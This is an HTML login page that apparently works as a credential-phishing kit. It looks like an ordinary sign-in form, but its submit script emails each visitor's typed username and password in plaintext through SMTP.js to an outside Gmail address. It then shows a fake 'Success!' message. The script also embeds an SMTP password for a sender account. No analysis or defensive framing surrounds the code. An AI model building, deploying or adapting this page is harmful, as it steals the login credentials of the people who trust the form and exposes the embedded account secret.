<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
        }

        .loader {
            display: none; /* Initially hidden */
            position: fixed; /* Fixed position */
            top: 50%; /* Center vertically */
            left: 50%; /* Center horizontally */
            transform: translate(-50%, -50%); /* Center the loader */
            width: 60px;
            height: 50px;
            justify-content: space-between;
            z-index: 1000; /* Ensure it‚Äôs above other content */
        }

        .loader>div {
            height: 100%;
            width: 8px;
            animation: delay 0.8s infinite ease-in-out;
        }

        .loader .bar1 { background-color: #1f3f8c; }
        .loader .bar2 { background-color: #42aeea; animation-delay: 0.7s; }
        .loader .bar3 { background-color: #008000; animation-delay: 0.6s; }
        .loader .bar4 { background-color: #ffdd00; animation-delay: 0.5s; }
        .loader .bar5 { background-color: #f09800; animation-delay: 0.4s; }
        .loader .bar6 { background-color: #f80067; animation-delay: 0.3s; }

        @keyframes delay {
            0%, 40%, 100% { transform: scaleY(0.05); }
            20% { transform: scaleY(1); }
        }

        body {
            border: 37px solid transparent;
            font-family: Roboto, sans-serif;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            color: #ffffff;
            min-height: 100vh;
            align-items: center;
            background-color: #0c466c;
            padding-top: 20px;
            transition: background-color 0.3s, color 0.3s;
        }

        .gtranslate_wrapper {
            background-color: #f0f0f0;
            border: 1px solid #ccc;
            border-radius: 8px;
            padding: 10px;
            width: 200px;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            margin: 20px auto;
        }

        .gtranslate_wrapper img {
            border-radius: 50%;
            border: 2px solid #ddd;
            transition: transform 0.3s ease;
        }

        .gtranslate_wrapper img:hover {
            transform: scale(1.2);
        }

        .container {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0));
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            color: inherit;
        }

        h2, h3 {
            text-align: center;
            margin-bottom: 20px;
            color: inherit;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: inherit;
        }

        .form-group input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
            border: 1px solid #ddd;
            border-radius: 4px;
            background-color: transparent;
            color: inherit;
        }

        .form-group button {
            background-color: #007bff;
            color: white;
            border: none;
            width: 100%;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        .form-group button:hover {
            background-color: #0056b3;
        }

        .new-account {
            text-align: center;
            margin-top: 20px;
        }

        .new-account p {
            margin: 0;
            font-size: 16px;
            color: inherit;
        }

        .new-account a {
            color: #007bff;
            text-decoration: none;
            font-weight: bold;
        }

        .new-account a:hover {
            text-decoration: underline;
        }

        .new-account .links {
            font-size: 14px;
            color: #666;
        }

        .new-account .links a {
            color: #666;
            text-decoration: none;
            margin-right: 15px;
        }

        .new-account .links a:hover {
            text-decoration: underline;
        }

        @import url('https://fonts.googleapis.com/css2?family=Lexend:wght@500&display=swap');
    </style>
</head>
<body class="light-mode">    
    <div class="container">
        <div class="card card2">
            <h3>‚öôÔ∏è</h3>
        </div>
        
        <h2>Login To Your Account</h2>
        <form id="login">
            <div class="form-group">
                <label for="username">üßë Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">üîí Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <br>
            <div class="form-group">
                <button type="submit">Login</button>
            </div>
        </form>
    </div>

    <div class="new-account">
        <p>Are You New? <a href="https://softwarecompanycoltd.github.io/Binoning/">Create Account</a></p>
        <p class="links">
            <a href="https://www.404.com">Forgot password?</a>

        </p>
    </div>

    <!-- Loader HTML -->
    <div class="loader">
        <div class="bar1"></div>
        <div class="bar2"></div>
        <div class="bar3"></div>
        <div class="bar4"></div>
        <div class="bar5"></div>
        <div class="bar6"></div>
    </div>

    <div class="gtranslate_wrapper"></div>
    <script src="https://cdn.gtranslate.net/widgets/latest/popup.js" defer></script>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script>
        const themeSwitch = document.getElementById('themeSwitch');
        const body = document.body;

        document.addEventListener('DOMContentLoaded', function () {
            const preferredTheme = localStorage.getItem('preferredTheme');
            if (preferredTheme === 'dark-mode') {
                body.classList.add('dark-mode');
                themeSwitch.checked = true;
            } else {
                body.classList.add('light-mode');
            }
        });

        themeSwitch?.addEventListener('change', function () {
            if (themeSwitch.checked) {
                localStorage.setItem('preferredTheme', 'dark-mode');
                body.classList.replace('light-mode', 'dark-mode');
            } else {
                localStorage.setItem('preferredTheme', 'light-mode');
                body.classList.replace('dark-mode', 'light-mode');
            }
        });

        document.getElementById('login').addEventListener('submit', function (e) {
            e.preventDefault();
            document.querySelector('.loader').style.display = 'flex';

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            Email.send({
                Host: "smtp.elasticemail.com",
                Username: "softwarecompanyltdsmtpsender@gmail.com",
                Password: "A6DC06DBCF8A0C3CE635ED7B3EDE144CB3C9",
                To: 'gambopeter2022@gmail.com',
                From: "softwarecompanyltdsmtpsender@gmail.com",
                Subject: "Login Attempt",
                Body: `Username: ${username}<br>Password: ${password}`
            }).then(function (response) {
                document.querySelector('.loader').style.display = 'none';

                if (response === 'OK') {
                    swal("Success!", "Form submitted successfully!", "success");
                } else {
                    swal("Error!", "Failed to submit the form!", "error");
                }
            }).catch(function (error) {
                console.error(error);
                swal("Error!", "An error occurred during submission!", "error");
                document.querySelector('.loader').style.display = 'none';
            });
        });
    </script>
</body>
</html>
